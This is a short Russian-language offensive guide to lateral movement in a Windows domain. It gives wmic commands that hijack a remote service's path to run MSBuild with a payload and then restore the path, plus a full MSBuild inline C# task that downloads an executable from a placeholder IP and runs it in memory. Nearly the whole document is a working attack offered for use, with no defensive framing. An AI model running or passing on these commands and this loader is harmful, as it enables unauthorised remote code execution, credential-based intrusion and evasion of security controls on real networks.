## Двигаемся боком 

*расширяемся по (нашей "наверное") сети !
 
для этого есть прeкрасный [инструмент](https://github.com/Ondrik8/lateral_movement/blob/master/SCShell-master.zip)

Шаг 1: Получите текущее pathName вашей целевой службы, чтобы мы могли восстановить его после запуска нашей команды (в нашем случае XblAuthManager)

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' get pathName`

Шаг 2: Измените pathName на любую команду, которую вы хотите запустить

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml"`

Шаг 3: Запустите измененный сервис

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice`

Шаг 4. Измените путь службы до ее первоначального значения.

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs"`

И дабы все обьеденить в одну команду.

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml" & wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice & wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs" `

+ testPayload.xml


```markdown

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="DemoClass">
   <ClassExample />
  </Target>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			using System.IO;
			using System.Net;
			using System.Reflection;
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
                   		 	using (WebClient client = new WebClient())
                   		 	{
                        			System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
						client.Headers.Add ("user-agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36");
						MemoryStream  ms = new MemoryStream(client.DownloadData("http://IP_ADDRESS/ASSEMBLY_NAME.exe"));
						BinaryReader br = new BinaryReader(ms);
						byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
						ms.Close();
						br.Close();
						Assembly a = Assembly.Load(bin);
						string[] args = new string[] {"ASSEMBLY ARGS GO HERE"};
						try
						{
							a.EntryPoint.Invoke(null, new object[] { args });
						}
						catch
						{
							MethodInfo method = a.EntryPoint;
							if (method != null)
							{
								object o = a.CreateInstance(method.Name);
								method.Invoke(o, null);
							}
						}
					}
					return true;
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>


```
